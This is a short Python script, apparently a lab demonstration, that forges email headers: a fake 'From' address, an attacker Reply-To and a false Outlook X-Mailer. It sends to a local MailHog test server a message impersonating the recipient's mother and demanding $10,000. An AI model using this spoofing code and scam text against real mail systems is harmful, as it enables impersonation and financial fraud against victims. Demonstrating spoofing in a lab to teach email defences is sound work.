import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Define sender and receiver
sender_email = "evil.sender@mail.com"  #the real sender's email
receiver_email = "my.mail@mail.com"  #the victim's email

# Injected Headers
headers = {
    "From": "your.mom@outlook.com",
    "To": receiver_email,
    "Subject": "Emergency",
    "X-Mailer": "Microsoft Outlook", #identifies the email client or software used to send the email 
    "Reply-To": "evil.sender@example.com",
    "X-Injected-Header": "Safe mail" #we can also inject headers besides the ones typically found in headers to add new "arguments" in the email
}

# Create the email
msg = MIMEMultipart()
msg["From"] = headers["From"]  
msg["To"] = headers["To"]
msg["Subject"] = headers["Subject"]
msg["Reply-To"] = headers["Reply-To"]
msg["X-Mailer"] = headers["X-Mailer"]


body = "This is an emergency, I'll call you later, send me 10000 dollars to this account XXXXXXXXXXXX. Mom"
msg.attach(MIMEText(body, "plain"))

# Send email through MailHog SMTP server
try:
    with smtplib.SMTP("localhost", 1025) as server:  # MailHog SMTP
        server.sendmail(sender_email, receiver_email, msg.as_string())
        print("Fake email sent successfully!")
except Exception as e:
    print(f"Failed to send email: {e}")
